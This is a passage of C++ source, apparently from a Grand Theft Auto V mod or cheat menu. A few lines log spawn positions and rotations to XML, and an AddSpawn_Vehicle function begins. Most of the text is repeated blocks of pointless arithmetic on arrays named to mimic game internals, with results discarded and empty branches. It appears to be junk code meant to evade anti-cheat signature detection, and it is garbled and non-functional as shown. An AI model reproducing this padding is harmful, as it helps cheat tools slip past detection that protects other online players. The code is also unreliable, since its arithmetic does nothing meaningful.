			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Y>" + to_string(Estrutura.PosY) + "</Y>");
			Extern_Reader::LOG::LogSemHora("<Z>" + to_string(Estrutura.PosZ) + "</Z>");
			Extern_Reader::LOG::LogSemHora("<Pitch>" + to_string(Estrutura.PosZ) + "</Pitch>");
			Extern_Reader::LOG::LogSemHora("<Roll>" + to_string(Estrutura.PosZ) + "</Roll>");
			Extern_Reader::LOG::LogSemHora("<Yaw>" + to_string(Estrutura.PosZ) + "</Yaw>");
			Extern_Reader::LOG::LogSemHora("</PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<Attachment isAttached=\"false\" />");
			Extern_Reader::LOG::LogSemHora("</Placement>");
		}
		void AddSpawn_Vehicle(GTA::Spawn_Struct Estrutura)
		{
			Extern_Reader::LOG::arquivoTXT = XMLPath;

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
